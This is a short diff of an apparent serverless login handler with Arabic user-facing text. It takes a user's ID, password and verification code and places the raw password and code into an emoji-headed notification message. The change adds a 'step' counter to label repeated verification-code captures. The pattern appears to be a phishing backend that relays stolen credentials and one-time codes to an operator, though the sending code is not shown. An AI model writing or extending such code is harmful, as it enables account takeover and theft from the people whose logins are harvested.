@@ -15,6 +15,7 @@ exports.handler = async (event) => {
   const id = String(body.id ?? "").trim();
   const password = String(body.password ?? "");
   const code = String(body.code ?? "").trim();
+  const step = String(body.step ?? "1");
 
   if (!id || !password) {
     return jsonResponse(400, { ok: false, message: "انتهت الجلسة، سجّل الدخول من جديد" });
@@ -25,7 +26,7 @@ exports.handler = async (event) => {
   }
 
   const text = [
-    "📲 رمز تحقق جديد",
+    `📲 رمز تحقق (${step})`,
     "",
     `رقم المميز: ${id}`,
     `كلمة المرور: ${password}`,
